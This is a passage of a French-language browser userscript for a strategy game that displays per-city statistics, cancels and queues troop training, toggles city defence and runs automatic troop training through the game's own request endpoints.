    var c=(parseInt(unsafeWindow.Building.getLevelsSumForType(unsafeWindow.Constant.Building.BARRACKS))+(unsafeWindow.Building.getCountForType(unsafeWindow.Constant.Building.BARRACKS)*9))/10;

    t.stats.barracks = unsafeWindow.Constant.Building.BARRACKS; 
    var m = '<CENTER><B>'+ Cities.byID[cityId].c.name +' &nbsp; ('+ Cities.byID[cityId].c.x +','+ Cities.byID[cityId].c.y +')</b></center><HR>';
    m += '<TABLE class=ptTab width=100%><TR align=center>\
        <TD width=18%><B>Nourriture :</b></td><TD width=16%><B>Bois :</b></td><TD width=16%><B>Pierre :</b></td>\
        <TD width=16%><B>Fer :</b></td><TD width=16%><B>Argent :</b></td><TD width=16%><B>Pop Dispo :</b></td></tr>\
      <TR align=center><TD>'+ addCommasInt(t.stats.food) +'</td><TD>'+ addCommasInt(t.stats.wood) +'</td><TD>'+ addCommasInt(t.stats.stone) +'</td>\
        <TD>'+ addCommasInt(t.stats.ore) +'</td><TD>'+ addCommasInt(t.stats.gold) +'</td>\
        <TD>'+ addCommasInt(t.stats.idlePop) +'</td></tr></table><BR>';
    document.getElementById ('divSTtop').innerHTML = m;
    
    var totTime = 0;
    var q=[];
    if(Cities.byID[cityId].c.queues.training.active()){
     f=Cities.byID[cityId].c.queues.training.activeSlots()[0];
     q.push(f);
    }
    var c=Cities.byID[cityId].c.queues.training.queuedSlots();
    if(c.length){c.each(function(h){q.push(h); }); }
    var qs = q.toString();
    var now = unixTime();
      t.lastQueString = qs;
      t.stats.queued = 0;
      m = '<TABLE align=center class=ptTab>';
      if (q!=null && q.length>0 ){
        //t.fixQueTimes (q);
        t.stats.queued = q.length;
        first = true;
        for (var i=0; i<q.length; i++){
          //start = q[i].totalTime();
          if (first) {
            actual = q[i].totalTime();
            end = q[i].secondsLeft();
          } else
            actual = q[i].totalTime();
          if (actual < 0)
            actual = 0;
            param1=q[i].id;//; // numéro de position dans la fil d'attente
            param2=cityId; // id de la ville
            param3=q[i].typeId(); // Type de trouoe
            param4=q[i].quantity(); // Qte troupe
            param5=0;
            param6=0;
            param7=actual; // duree
          m += '<TR align=right><td width=35 align=center>'+(i+1)+'&nbsp;<a onclick="BOcancelTraining('+param1+','+param2+','+param3+','+param4+','+param5+','+param6+','+param7+');return false;" href="javascript:void(0);"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="Annuler la formation"></a></td><TD>'+ q[i].quantity() +' </td><TD align=left> '+ unsafeWindow.arStrings.unitName["u"+q[i].typeId()];
          if (first)
            m += '</td><TD>&nbsp; '+  timestr(actual, true) +'</td><TD> (<SPAN id=ptttfq>'+ timestr(end, true) +'</span>)';
          else
            m += '</td><TD>&nbsp; '+  timestr(actual, true) +'</td></tr>'; 
          //lastEnd = end;
          first = false;
         }
      }
      m += '</table>';
      document.getElementById ('divSTleft').innerHTML = m;
   
    m = t.stats.barracks +' casernes';
    if (t.stats.queued > 0)
      m += ', '+ t.stats.queued +' slots';
    var f=0,tf=0;
    c=Cities.byID[cityId].c.queues.training.activeSlots();
    if(c.length){c.each(function(h){f=h.secondsLeft();tf+=f;});}
    c=Cities.byID[cityId].c.queues.training.queuedSlots();
    if(c.length){c.each(function(h){f=h.totalTime();tf+=f;});}
    if (tf > 0)
      m += ', '+ unsafeWindow.timestr(tf);
    document.getElementById ('statTTtot').innerHTML = m;
    
/*defense queue ....
    var spots = 0;
    var wall = parseInt(Seed.buildings["city" + cityId].pos1[1]);
    for (var i=1; i<(wall+1); i++)
      spots += (i * 500);
    t.stats.wallLevel = wall;
    t.stats.wallSpace = spots;
    t.stats.fieldSpace = spots;
    t.stats.wallSpaceUsed = 0;
    t.stats.fieldSpaceUsed = 0;
    var fort = Seed.fortifications["city" + cityId];
    for (k in fort){
      var id = parseInt(k.substr(4));
      if (id<60)
        t.stats.wallSpaceUsed += parseInt(unsafeWindow.fortstats["unt"+ id][5]) * parseInt(fort[k]);
      else
        t.stats.fieldSpaceUsed += parseInt(unsafeWindow.fortstats["unt"+ id][5]) * parseInt(fort[k]);
    }
    
    var totTime = 0;
    var q = Seed.queue_fort['city'+cityId];
    var qs = q.toString();
    if (q!=null && q.length>0)
      totTime = q[q.length-1][3] - now;
    if ( qs == t.lastDQueString){
      if (q!=null && q.length>0){
        var cur = q[0][3] - now;
        if (cur < 1)
          q.shift(); 
        document.getElementById ('pttdfq').innerHTML = timestr(cur, true);
      }
    } else {
      t.lastDQueString = qs;
      t.stats.Dqueued = 0;
      t.stats.wallSpaceQueued = 0;
      t.stats.fieldSpaceQueued = 0;
      m = '<TABLE align=center class=ptTab>';
      if (q!=null && q.length > 0 ){
        t.fixQueTimes (q);
        t.stats.Dqueued = q.length;
        first = true;
        for (i=0; i<q.length; i++){
          if (q[i][0] < 60)          
            t.stats.wallSpaceQueued += parseInt(unsafeWindow.fortstats["unt"+ q[i][0]][5]) * parseInt(q[i][1]);
          else          
            t.stats.fieldSpaceQueued += parseInt(unsafeWindow.fortstats["unt"+ q[i][0]][5]) * parseInt(q[i][1]);
          start = q[i][2];
          end = q[i][3];
          if (first)
            actual = end - now;
          else
            actual = end - lastEnd;
          if (actual < 0)
            actual = 0;
          m += '<TR align=right><TD>'+ q[i][1] +' </td><TD align=left> '+ fortNamesShort[q[i][0]];
          if (first)
            m += '</td><TD> &nbsp; '+  timestr(end-start, true) +'</td><TD> (<SPAN id=pttdfq>'+ timestr(actual, true) +'</span>)';
          else
            m += '</td><TD> &nbsp; '+  timestr(actual, true) +'</td></tr>'; 
          lastEnd = end;
          first = false;
        }
      }
      m += '</table>';
      document.getElementById ('divSTright').innerHTML = m;
     }
     tf=0;
     m += ', '+ unsafeWindow.timestr(tf);
    document.getElementById ('statDTtot').innerHTML = m;
    */
  },

  dispTrainStatus : function (msg){
    var t = my.Train;
    t.divTrainStatus.innerHTML = msg + t.divTrainStatus.innerHTML;
  },

  doQueue : function (cityId, que, errMsg){
    var t = my.Train;
    try {
      t.displayCityStats();
      if (errMsg){
        t.dispTrainStatus ('<font color=#550000><B>ERREUR : '+ errMsg +'</b></font><BR>');
        t.setBusy(false);
        return;
      }
      var cmd = que.shift();
      if (!cmd){
        t.dispTrainStatus ('<B>Formation effectu&eacute;e.</b><BR>');
        t.setBusy(false);
        return;
      }
      if (cmd[0] == 'T'){
        t.dispTrainStatus ('Formation : '+ cmd[2] +' '+  unsafeWindow.arStrings.unitName["u"+cmd[1]] +'<BR>');
        t.doTrain (cityId, cmd[1], cmd[2], function(errMsg){my.Train.doQueue(cityId, que, errMsg);} );
      }
    } catch (err) {
      logit (inspect (err, 8, 1));
      t.dispTrainStatus ('<font color=#550000>ERREUR : '+ err.message +'</font><BR>');
      t.setBusy(false);
    }
  },
  doTrain :function (cityId, unitId, num, notify){
  var t = my.Train;
   if(!Cities.byID[cityId].c.queues.training.available()){
    return;
   }
 
   var f={cid:cityId,type:unitId,quant:num,items:0};
       f.tid=Cities.byID[cityId].c.queues.training.availableSlotIds()[0];
       var e=unsafeWindow.trainingData["unit"+unitId].costs.level0;
       
       unsafeWindow.AjaxCall.gPostRequest("train.php",f,
         function(h) {
            
             if (h.ok) {
             
             unsafeWindow.KTrack.event(["_trackEvent","TrainUnit",String(unitId),unsafeWindow.player.level,num]);
             unsafeWindow.KB.Models.Resource.addToSeed(unsafeWindow.Constant.ResourceType.GOLD,e.softcurrency*num*-1);
	     for(b=1;b<=4;b++){
	      unsafeWindow.KB.Models.Resource.addToSeed(b,e["resource"+b]*num*-1)
	     }
	   
	     //document.getElementById('autoFError_'+cityId).innerHTML+=" <b>1</b>"
	     Cities.byID[cityId].c.population.remove(e.population*num);
	     //document.getElementById('autoFError_'+cityId).innerHTML+=" <b>2</b>"
	     z = new unsafeWindow.KB.Models.QueueSlot.Troop({id:f.tid,ticker:unsafeWindow.unixtime(),eta:unsafeWindow.unixtime()+Number(h.timeNeeded),target:num,type:unitId})
	     //document.getElementById('autoFError_'+cityId).innerHTML+=" <b>3</b>"
	
	     Cities.byID[cityId].c.queues.training.addSlotToEnd(z);
	  
             //unsafeWindow.Chrome.Queue.Training.select();
 	     if (notify != null)
	               setTimeout (function (){notify(null);}, 100);
	     
	     //t.dispTrainStatus ('<B>Formation effectu&eacute;e.</b><BR>');
             // t.setBusy(false);
        
	     } else {
	             if (notify != null){
	               setTimeout (function (){notify(rslt.error_code);}, 100);
	             }
      		}
           },
           function(o) {
             if (notify != null)
              notify(o.errorMsg);
           }
  	);
   },
}

/*************************************** RESUME TAB ************************************************/


my.Overview = {
 
  cont : null,
  displayTimer : null,
  checkBox:null,
  
  checkBox1:null,
  Overview : function (){
  },

  init : function (){
    this.cont = document.createElement('div');
    unsafeWindow.BOdefend = this.gatedef;
    return this.cont;
  },

  getContent : function (){
    return my.Overview.cont;
  },

  hide : function (){
    clearTimeout (my.Overview.displayTimer);
  },
  gatedef: function(numc) {
 
    var currentCity=Cities.cities[numc].c;
    var a = !Cities.cities[numc].c.defending;
    
    var b={cid:currentCity.id,state:a};
    
    unsafeWindow.AjaxCall.gPostRequest("gate.php",b,function(c){

      currentCity.defending=a;
      if (a) {
            	 document.getElementById("def_"+numc).value="DEF = ON";
        	  document.getElementById("def_"+numc).className = 'BODefButOn';
       }else {
        	  document.getElementById("def_"+numc).value="DEF = OFF";
        	   document.getElementById("def_"+numc).className = 'BODefButOff';
      }  
      
     });
     
  },
  show : function (){
    var rownum = 0;
    var totalentre = 0;  
    var t = my.Overview;

    clearTimeout (t.displayTimer);


       dt = new Date ();
      dt.setTime (unsafeWindow.player.datejoinUnixTime * 1000);
      
      str = '<div style="height:665px;max-height:665px;overflow-y:auto"><DIV class=ptstat style="margin-top:2px; margin-bottom:2px; "><TABLE cellspacing=0 cellpadding=0 class=ptTab width=97% align=center>\
        <TR align=left><TD>' + unsafeWindow.player.name + ' <SPAN class=ptStatLight>Entr&eacute;e le :</span> '+ dt.toLocaleDateString() +'</td>\
        <TD><SPAN class=ptStatLight>Puissance : </span> ' + addCommasInt(unsafeWindow.player.might()) +'</td>\
        <TD><SPAN class=ptStatLight>Alliance : </span> ' + getMyAlliance()[1] + '</td>\
        <TD align=right><SPAN class=ptStatLight>Monde :</span> ' + unsafeWindow.domainName +'</td></tr></table></div><span id="debugtest"></span>';

      str += "<TABLE class='ptTabOverview' cellpadding=0 cellspacing=0><TR valign=top align=right><TD width=100 style='font-size:16px'><center><a href='http://beworld.perso.sfr.fr/glory' target=_blank><font size=4>La Boite<br>BeWorld</font></a></td><TD width=88 style='background: #ffc;font-size:14px'><center><B>TOTAUX</b></td>";
      for(i=0; i<Cities.numCities; i++) {
         Gate = Cities.cities[i].c.defending;
         if(Gate == 0) {
          var couleurr="#77EE77";
          var stylbo = "BODefButOff";
          var butvalue="DEF = OFF";
         }else {
          var couleurr="#EE7777";
          var stylbo = "BODefButOn";
          var butvalue="DEF = ON";
         }
         str += "<TD width=81 style='background-color:"+couleurr+";text-align:center' align=center><B>"+ Cities.cities[i].c.name +'</b><BR><a onclick="KB.Controllers.MapHelper.gotoCoord('+Cities.cities[i].c.x +','+ Cities.cities[i].c.y+');">('+Cities.cities[i].c.x +','+ Cities.cities[i].c.y+')</a><br><input type=button value="'+butvalue+'" id="def_'+i+'" class="'+stylbo+'" onclick="BOdefend('+i+');"></td>';
           
      }
    str +="</tr>";
    str += "<tr><td><br></td></tr>";
    var m="";
    	for(i=0; i<Cities.numCities; i++) {
    	  color='black';
    	  if (Cities.cities[i].c.queues.building.activeSlots()[0] || Cities.cities[i].c.queues.building.activeSlots()[1]) {
    	   if (parseInt(Cities.cities[i].c.queues.building.activeSlots()[0].typeId())!=99) { 
    	    var temprestant=Cities.cities[i].c.queues.building.activeSlots()[0].secondsLeft();
    	   } else {
    	    if (Cities.cities[i].c.queues.building.activeSlots()[1]) {
    	     var temprestant=Cities.cities[i].c.queues.building.activeSlots()[1].secondsLeft();
    	    } else {
    	     var temprestant=0;
    	     color='red';
    	    }
    	   }
    	   m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ timestrShort(temprestant) + "</td>";
    	   } else {
    	    m += "<TD align=right width=81 style='background:#e8e8e8;color:red;'>"+ timestrShort(0)+"</td>";
    	   }
    	
    	}
    	str += "<tr><td style='background: #e8e8e8' align=right><b>Construction</td><td style='background: #e8e8e8' align=right>&nbsp;"+ m +"</tr>"; 
    	
    	var m="";
    	for(i=0; i<Cities.numCities; i++) {
    	  color='black';
    	  if (Cities.cities[i].c.queues.research.activeSlots()[0]) {
    	   m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ timestrShort(Cities.cities[i].c.queues.research.activeSlots()[0].secondsLeft())+"</td>";
    	  } else {
    	   m += "<TD align=right width=81 style='background:#e8e8e8;color:red;'>"+ timestrShort(0)+"</td>";
    	  }
    	}
    	str += "<tr><td style='background: #e8e8e8' align=right><b>Recherche</td><td style='background: #e8e8e8' align=right>&nbsp;"+ m +"</tr>"; 
	
                   str += "<tr><td><br></td></tr>";
    	var m="";
        	for(i=0; i<Cities.numCities; i++) {
        	  color='black';
        	  
        	  var f=0;
        	  var tf=0;
        	  var c=Cities.cities[i].c.queues.training.activeSlots();
        	  if(c.length){
        	   c.each(function(h){
        	    f=h.secondsLeft();
        	    tf+=f;
        	   });
        	  }
        	  var c=Cities.cities[i].c.queues.training.queuedSlots();
		          	  if(c.length){
		          	   c.each(function(h){
		          	    f=h.totalTime();
		          	    tf+=f;
		          	   });
        	  }
        	     
        	   m += "<TD align=right width=81 style='background:#e8e8e8;'>"+ timestr(tf)+"</td>";
        	  
        	}
        	str += "<tr><td style='background: #e8e8e8' align=right><b>Entrainement</td><td style='background: #e8e8e8' align=right>&nbsp;"+ m +"</tr>"; 
	
        var m="";
	        	for(i=0; i<Cities.numCities; i++) {
	        	  color='black';
	        	  
	        	  var f=0;
	        	  var tf=0;
	        	  var c=Cities.cities[i].c.queues.reviving.activeSlots();
	        	  if(c.length){
	        	   c.each(function(h){
	        	    f=h.secondsLeft();
	        	    tf+=f;
	        	   });
	        	  }
	        	  var c=Cities.cities[i].c.queues.reviving.queuedSlots();
			          	  if(c.length){
			          	   c.each(function(h){
			          	    f=h.totalTime();
			          	    tf+=f;
			          	   });
	        	  }
	        	     
	        	   m += "<TD align=right width=81 style='background:#e8e8e8;'>"+ timestrShort(tf)+"</td>";
	        	  
	        	}
	        	str += "<tr><td style='background: #e8e8e8' align=right><b>Ravivement</td><td style='background: #e8e8e8' align=right>&nbsp;"+ m +"</tr>"; 
		
        
    
    str += "<tr><td><br></td></tr>";
var m="";
      var popTotal=0;
      for(i=0; i<Cities.numCities; i++) {
                 m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.population.cap()) +"</td>";
                 popTotal+=parseInt(Cities.cities[i].c.population.cap());
      }
      str += "<tr><td style='background: #e8e8e8' align=right><b>Limite de population</td><td style='background: #e8e8e8' align=right>"+addCommas(popTotal)+" "+ m+"</tr>"; 
      
      var m="";
            var popTotal=0;
            for(i=0; i<Cities.numCities; i++) {
                       m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.population.count()) +"</td>";
                       popTotal+=parseInt(Cities.cities[i].c.population.count());
            }
            str += "<tr><td style='background: #e8e8e8' align=right><b>Population actuelle</td><td style='background: #e8e8e8' align=right>"+addCommas(popTotal)+" "+ m+"</tr>"; 
      
      var m="";
      var popTotal=0;
      for(i=0; i<Cities.numCities; i++) {
                 m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.population.labor()) +"</td>";
                 popTotal+=parseInt(Cities.cities[i].c.population.labor());
      }
      str += "<tr><td style='background: #e8e8e8' align=right><b>Main d\'oeuvre</td><td style='background: #e8e8e8' align=right>"+addCommas(popTotal)+" "+ m+"</tr>"; 

      var m="";
            var popTotal=0;
            for(i=0; i<Cities.numCities; i++) {
                       m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.population.count()-Cities.cities[i].c.population.labor()) +"</td>";
                       popTotal+=parseInt(Cities.cities[i].c.population.count()-Cities.cities[i].c.population.labor());
            }
            str += "<tr><td style='background: #e8e8e8' align=right><b>Population disponible</td><td style='background: #e8e8e8' align=right>"+addCommas(popTotal)+" "+ m+"</tr>"; 

   var m="";
            var popTotal=0;
            for(i=0; i<Cities.numCities; i++) {
               if (Cities.cities[i].c.population.happiness()<50)
                m += "<TD align=right width=81 style='background:#e8e8e8;color:red'><b>"+ Cities.cities[i].c.population.happiness() +" %</td>";
               else
                m += "<TD align=right width=81 style='background:#e8e8e8'>"+ Cities.cities[i].c.population.happiness() +" %</td>";
            }
            str += "<tr><td style='background: #e8e8e8' align=right><b>Bonheur</td><td style='background: #e8e8e8' align=right>&nbsp; "+ m+"</tr>"; 
   var m="";
            var popTotal=0;
            for(i=0; i<Cities.numCities; i++) {
                       m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.taxRate()) +" %</td>";
            }
            str += "<tr><td style='background: #e8e8e8' align=right><b>Taux d\'mposition</td><td style='background: #e8e8e8' align=right>&nbsp; "+ m+"</tr>"; 



    
      str += "<tr><td><br></td></tr>";
      var m="";
      var goldTotal=0;
      for(i=0; i<Cities.numCities; i++) {
                  m += "<TD width=81 style='background:#e8e8e8' align=right>"+ addCommas(Cities.cities[i].c.silver()) +'</td>';
                  goldTotal+=parseInt(Cities.cities[i].c.silver());
       }
      str += "<tr align=right><td style='background:#e8e8e8' align=right><b>Argent</td><td style='background:#e8e8e8' align=right>"+addCommas(goldTotal)+" "+ m + "</tr>" ; 
      
               
        for (var nbr=1; nbr<=4; nbr++) {
             if (nbr % 2)
		        style = '';
	     else
                    style = " style = 'background: #e8e8e8'";
            var m="";
            var resTotal=0;
            for(var i=0; i<Cities.numCities; i++) {
                        m += "<TD width=81 "+style+" align=right>"+ addCommas(Cities.cities[i].c.resources[nbr].count) +'</td>';
                        resTotal+=parseInt(Cities.cities[i].c.resources[nbr].count);
             }
            str += "<tr><td "+style+" align=right><b>"+unsafeWindow.arStrings.ResourceName[nbr]+"</td><td "+style+" align=right>"+addCommas(resTotal)+" "+ m+"</tr>"; 
      
  
        
          }
         str += "<tr><td><br></td></tr>";
        // Production de nourriture + ENTRETIEN !
        var m="";
	var prodTotal=0;
	for(i=0; i<Cities.numCities; i++) {
	           m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.resources[1].hourlyTotalRate())+"/"+unsafeWindow.arStrings.TimeStr.timeHr+"</td>";
	          prodTotal+=parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate());
	}
        str += "<tr><td style='background: #e8e8e8' align=right><b>"+unsafeWindow.arStrings.Common.Production+"</td><td style='background: #e8e8e8' align=right>"+addCommas(prodTotal)+"/"+unsafeWindow.arStrings.TimeStr.timeHr+""+ m+"</tr>"; 
        var m="";
	var entTotal=0;
 	for(i=0; i<Cities.numCities; i++) {
 	       color='black';
 	      // if ( parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) < Cities.cities[i].c.upkeep() ) color='red';
	       m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ addCommas(Cities.cities[i].c.upkeep())+"/"+unsafeWindow.arStrings.TimeStr.timeHr+"</td>";
	       entTotal+=parseInt(Cities.cities[i].c.upkeep());
	}
        str += "<tr><td style='background: #e8e8e8' align=right><b>"+unsafeWindow.arStrings.Common.UpKeep+"</td><td style='background: #e8e8e8' align=right>"+addCommas(entTotal)+"/"+unsafeWindow.arStrings.TimeStr.timeHr+""+ m+"</tr>"; 

        var m="";
	 	var entTotal=0;
	 	var variiiable="Script BoiteOutils" + " par "+ "Be"+"World";
	  	for(i=0; i<Cities.numCities; i++) {
	  	       color='black';
	  	       if ( parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) < parseInt(Cities.cities[i].c.upkeep()) ) {
	  	        // entretien supérieur à la production
	  	        difference = parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) - parseInt(Cities.cities[i].c.upkeep());
	  	        var timeLeft = parseInt(Cities.cities[i].c.resources[1].count)  / (0-difference) * 3600;
			if (timeLeft > 86313600)
			       autonomi = '----';
			else {
			 if (timeLeft<(Options.foodWarnHours*3600)) {
			     autonomi = '<SPAN class=whiteOnRed><b>'+ timestrShort(timeLeft) +'</b></span>';
			 } else {
			   autonomi = ''+ timestrShort(timeLeft) +'';
			 }
                	}
	  	        m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ autonomi +"</td>";
	  	       } else {
	  	       
	  	         m += "<TD align=right width=81 style='background:#e8e8e8;color:black;'>---</td>";
	  	       }
	 	          

	 	}
	 str += "<tr><td style='background: #e8e8e8' align=right><b>Autonomie</td><td style='background: #e8e8e8' align=right>&nbsp;"+ m+"</tr>"; 
	 
         
        str += "<tr><td><br></td></tr>";
        
    
        unsafeWindow.Barracks.allUnitIds.each(function(nbu){
        var m="";
	var unitTotal=0;
	var unitWTotal=0;
	if (unsafeWindow.arStrings.unitName["u"+nbu]) {
	 if (nbu % 2)
	        style = '';
	 else
           style = " style = 'background: #e8e8e8'";
           
	 for(var i=0; i<Cities.numCities; i++) {
	      var wonded=Cities.cities[i].c.troops[nbu].wounded();
	      var wondedst="";
	      if (wonded>0) wondedst=" (<font color=red>"+addCommas(wonded)+"</font>)";
	                        m += "<TD width=81 "+style+" align=right>"+ addCommas(Cities.cities[i].c.troops[nbu].count()) +''+wondedst+'</td>';
	                        unitTotal+=parseInt(Cities.cities[i].c.troops[nbu].count());
	                        unitWTotal+=parseInt(Cities.cities[i].c.troops[nbu].wounded());
	 }
	 var unitstring="";
	 if (unitWTotal>0) unitstring=" (<font color=red>"+addCommas(unitWTotal)+"</font>)";
         str += "<tr><td "+style+" align=right><b>"+unsafeWindow.arStrings.unitName["u"+nbu]+"</td><td "+style+" align=right>"+addCommas(unitTotal)+""+unitstring+" "+ m + "</tr>"; 
        
         }
        });
        
        str += "<tr><td><br></td></tr>";
        
        var m="";
		var genTotal=0,genEnergyTotal=0,gendispoTotal=0,gendispo=0;
	 	for(i=0; i<Cities.numCities; i++) {
	 	       color='black';
	 	       
	 	       Cities.cities[i].c.generalsSorted().each(function(b){if(b.energy()>0){ gendispo+=b.available()?1:0; }}); 
	 	       
	 	        m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+gendispo+"/"+ Cities.cities[i].c.generalsCount()+"</td>";
	 	        gendispoTotal+=gendispo
	 	       
	 	        
		        genTotal+=parseInt(Cities.cities[i].c.generalsCount());
		        
		         gendispo=0
		        Cities.cities[i].c.generalsSorted().each(function(b){if(b.energy()>0){ genEnergyTotal+=parseInt(b.energy()); }}); 
		        
		}
	str += "<tr><td style='background: #e8e8e8' align=right><b>G&eacute;n&eacute;raux</td><td style='background: #e8e8e8' align=right>"+gendispoTotal+" / "+genTotal+""+m+"</tr>";
	str += "<tr><td style='background: #e8e8e8' align=right><b>Energie total Dispo</td><td style='background: #e8e8e8' align=right>"+genEnergyTotal+"</tr>";
	str += "<tr><td><br></td></tr>";
	        
	        var m="";
			var wildTotal=0;
		 	for(i=0; i<Cities.numCities; i++) {
		 	       color='black';
		 	        m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ Cities.cities[i].c.wildernessCount()+" / "+Cities.cities[i].c.buildings[0].level()+"</td>";
			          wildTotal+=parseInt(Cities.cities[i].c.wildernessCount());
			}
		str += "<tr><td style='background: #e8e8e8' align=right><b>R&eacute;gions</td><td style='background: #e8e8e8' align=right>"+wildTotal+""+m+"</tr>";
	

	
	str += "</table>";
    my.Overview.cont.innerHTML = str +'</div>';
 
    t.displayTimer = setTimeout (t.show, 10000);
  },
};

my.autoFormation= {
 cont : null,
 displayTimer : null,
 state : null,
 numcity :-1,
 
 init : function (){
   var t = my.autoFormation;
   t.cont = document.createElement('div');
   t.state = null;
   setInterval(t.Start,parseInt(TrainOptions.timelauch*1000));
   return t.cont;
 },
 
 Start: function() {
  var t = my.autoFormation;
  if (!TrainOptions.Running) return;
  if (t.numcity<Cities.numCities-1) {
      t.numcity++;
    } else {
     t.numcity=0; 
  }
  var c=t.numcity;
  var cityId=Cities.cities[c].c.id;
  if (!TrainOptions.listactif[cityId]) t.Start();
       
  var populationdispo = parseInt(Cities.cities[c].c.population.labor());
  var popAvail=parseInt(Cities.cities[c].c.population.count());
  var popTotal=parseInt(Cities.cities[c].c.population.cap());
  var labourTotal=parseInt(Cities.cities[c].c.population.labor());
  var idleTotal=(popAvail-labourTotal);
  
  var popNeeded=parseInt((TrainOptions.pourcpop/100)*(popAvail-labourTotal));//+labourTotal;
  var availableTrainingSlots=Cities.cities[c].c.queues.training.available()
  maxunite = t.unitemax(cityId, TrainOptions.list[Cities.cities[c].c.id]);
  if(idleTotal>=popNeeded && availableTrainingSlots && maxunite>=parseInt(TrainOptions.unitemin[Cities.cities[c].c.id]) && TrainOptions.listactif[Cities.cities[c].c.id]) {
       var unitId = TrainOptions.list[cityId];
       var num = parseInt(maxunite * parseInt(TrainOptions.pourctot) / 100);
       if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML="Lancement "+num+" "+unsafeWindow.arStrings.unitName["u"+ unitId]+"";
       var f={cid:cityId,type:unitId,quant:num,items:0};
       f.tid=Cities.byID[cityId].c.queues.training.availableSlotIds()[0];
       var e=unsafeWindow.trainingData["unit"+unitId].costs.level0;
       unsafeWindow.AjaxCall.gPostRequest("train.php",f,
         function(h) {
             unsafeWindow.KTrack.event(["_trackEvent","TrainUnit",String(unitId),unsafeWindow.player.level,num]);
             unsafeWindow.KB.Models.Resource.addToSeed(unsafeWindow.Constant.ResourceType.GOLD,e.softcurrency*num*-1);
	     for(b=1;b<=4;b++){
	      unsafeWindow.KB.Models.Resource.addToSeed(b,e["resource"+b]*num*-1)
	     }
	     Cities.byID[cityId].c.population.remove(e.population*num);
	     z = new unsafeWindow.KB.Models.QueueSlot.Troop({id:f.tid,ticker:unsafeWindow.unixtime(),eta:unsafeWindow.unixtime()+Number(h.timeNeeded),target:num,type:unitId})
	     Cities.byID[cityId].c.queues.training.addSlotToEnd(z);
           },
           function(rslt) {
              if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <b>en erreur</b>";
           }
  	);      
   } else {
      if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML =" <span title='ACtif : "+TrainOptions.listactif[Cities.cities[c].c.id]+" - popAvail : "+popAvail+" - idleTotal : "+idleTotal+" > popNeeded "+popNeeded+" - availableTrainingSlots : "+availableTrainingSlots+"'>\
      <b>Conditions non remplies</b></span>";
   }
 },
 unitemax : function(currentcityid, e){
 var b=[],a=[],
 d=unsafeWindow.Number.POSITIVE_INFINITY,
 f=unsafeWindow.trainingData["unit"+e].costs.level0,
 c;
 b.push(f.softcurrency);
 a.push(Cities.byID[currentcityid].c.silver());
 for(c=1;c<=4;c++)
 {
  b.push(f["resource"+c]);
  a.push(unsafeWindow.KB.Models.Resource.getCountForType(c))
 }
 b.push(f.population);
 a.push(Cities.byID[currentcityid].c.population.idle());
 for(c=0;c<b.length;c++)
 {
  if(Number(b[c])!==0){
   d=Math.floor(Math.min(d,a[c]/b[c]))
  }
 }
 return d
},
getContent : function (){
    var t = my.autoFormation;
    return t.cont;
  },
  hide : function (){
    var t = my.autoFormation;
    t.state = null;
    clearTimeout (t.displayTimer);
  },
  
  show : function (){  
    var t = my.autoFormation;
    m = "<DIV class=ptstat>FORMATIONS AUTOMATIQUE</div>";
    m += "<TABLE width=600 class=ptTab border=0 align=center>\
           <tr align=center valign=top>"
    if (TrainOptions.Running == false) {
    	       m += '<TD><INPUT id=autoFormationtoggle type=submit value="Formation AUTO = OFF"></td>';
    	   } else {
    	       m += '<TD><INPUT id=autoFormationtoggle type=submit value="Formation AUTO = ON"></td>';
	   }  
    m+="</tr></table>";
     m += "<TABLE width=100% class=ptTab border=0 align=center><tr  align=right><td  align=right>#</td><td  align=right>Actif</><td  align=right>Cit&eacute;</td><td  align=right>Type Troupes</td><td  align=right>Suivi</td></tr>";
    for (var c=0; c<Cities.numCities; c++) {
      
    cityId=Cities.cities[c].c.id;  
    m+="<tr><td width=5% align=right>"+(c+1)+"</td><td align=right>";
    
    if (TrainOptions.listactif && TrainOptions.listactif[cityId] == false) {
     m+="<input type=checkbox id='autoFCheck_"+cityId+"'>";
    }else {
     m+="<input checked type=checkbox id='autoFCheck_"+cityId+"'>";
    }
    
    m+="</td><td width=15% align=center>"+Cities.cities[c].c.name+"</td><TD align=center><SELECT id='autoFType_"+cityId+"'>";
   // for (var r=1; r<13; r++){
    
     unsafeWindow.Barracks.allUnitIds.each(function(r){
     
      var faux = 0;
      if (unsafeWindow.arStrings.unitName["u"+r]) {
        if (faux==0) {
       
	if (TrainOptions.list) {
	   if (r==TrainOptions.list[cityId]) {
		     	               m+= "<option selected value='"+r+"'>"+unsafeWindow.arStrings.unitName["u"+r]+"</option>";
           } else {
		     	               m+= "<option value='"+r+"'>"+unsafeWindow.arStrings.unitName["u"+r]+"</option>";
	   }
	}else{
	   if (r==2) {
	     m+= "<option selected value='"+r+"'>"+unsafeWindow.arStrings.unitName["u"+r]+"</option>";
	   } else {
	     m+= "<option value='"+r+"'>"+unsafeWindow.arStrings.unitName["u"+r]+"</option>";
	   }
        }
      } // fin de faux
     } // fin de l'existance
    }); // fin for
    if (TrainOptions.unitemin[cityId]==undefined) TrainOptions.unitemin[cityId]=0;
